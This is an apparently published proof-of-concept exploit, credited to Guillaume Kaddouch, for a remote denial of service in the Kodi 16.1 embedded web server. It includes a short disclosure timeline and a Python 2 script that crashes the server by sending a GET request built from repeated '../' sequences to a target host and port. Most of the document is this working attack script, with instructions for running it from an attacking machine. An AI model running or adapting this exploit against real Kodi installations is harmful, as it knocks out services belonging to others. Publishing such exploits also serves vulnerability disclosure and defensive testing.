# Exploit Title: Kodi 16.1 Web Server Remote DoS
# Date: 06/08/2016
# Exploit Author: Guillaume Kaddouch
#   Twitter: @gkweb76
#   Blog: https://networkfilter.blogspot.com
#   GitHub: https://github.com/gkweb76/exploits
# Vendor Homepage: https://kodi.tv/
# Software Link: http://mirrors.kodi.tv/releases/win32/kodi-16.1-Jarvis.exe
# Version: 16.1
# Tested on: Windows 7 Family x64 (FR)
# Category: DoS

"""
Disclosure Timeline:
--------------------
2016-08-02: Vulnerability discovered
2016-08-04: Vendor contacted
2016-08-04: Developper answered. Kodi v16 is End Of Life and will not be fixed. 
2016-08-06: Exploit published.

 
Description :
-------------
A remote Denial Of Service exists in Kodi 16.1 (Jarvis) embedded web server when sending a specially crafted GET request.
The web server is disabled by default.
 

Instructions:
-------------
- Starts Kodi, and enable the web server in System, Services, Web server.
- Run this exploit locally or from your remote attacking machine. 
"""

import socket

host = "192.168.135.129"
port = 8080

junk    = '../' * 10
buffer  = "GET " + junk + " HTTP/1.1\r\n"
buffer += "\r\n\r\n"

try:
        print "[*] Connecting to %s:%d" % (host, port)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))

        print "[*] Sending buffer... (%d bytes)" % len(buffer)
        s.send(buffer)
        s.close()

        print "[*] Done."
except:
        print "[-] Error connecting"